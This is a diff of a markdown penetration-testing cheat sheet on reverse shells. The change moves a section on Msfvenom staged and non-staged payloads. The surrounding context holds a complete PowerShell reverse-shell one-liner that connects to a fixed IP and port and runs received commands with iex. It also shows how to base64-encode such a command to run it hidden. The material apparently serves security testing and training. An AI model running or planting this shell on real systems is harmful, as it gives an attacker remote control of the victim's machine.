@@ -5,17 +5,8 @@ This is s great collection of different types of reverse shells and webshells. M
 
 [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 
-## Msfvenom
 
-There is an important difference between non-staged and staged payload. A **non-staged** shell is sent over in one block. You just send shell in one stage. This can be caught with metasploit multi-handler. But also with netcat.
-
-**staged** shells send them in turn. This can be useful for when you have very small buffer for your shellcode, so you need to divide up the payload. Meterpreter is a staged shell. First it sends some parts of it and sets up the connection, and then it sends some more. This can be caught with metasploit multi-handler but not with netcat.
-
-### Windows
-
-
-
-### PowerShell
+## PowerShell
 
 ```
 powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.135',444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
@@ -40,6 +31,15 @@ iconv -f ASCII -t UTF-16LE powershellcmd.txt | base64 | tr -d "\n"
 ```
 powershell.exe -EncodedCommand base64_payload_here
 ```
+
+## Msfvenom
+
+There is an important difference between non-staged and staged payload. A **non-staged** shell is sent over in one block. You just send shell in one stage. This can be caught with metasploit multi-handler. But also with netcat.
+
+**staged** shells send them in turn. This can be useful for when you have very small buffer for your shellcode, so you need to divide up the payload. Meterpreter is a staged shell. First it sends some parts of it and sets up the connection, and then it sends some more. This can be caught with metasploit multi-handler but not with netcat.
+
+### Windows
+
 #### Meterpreter
 
 **Standard meterpreter**
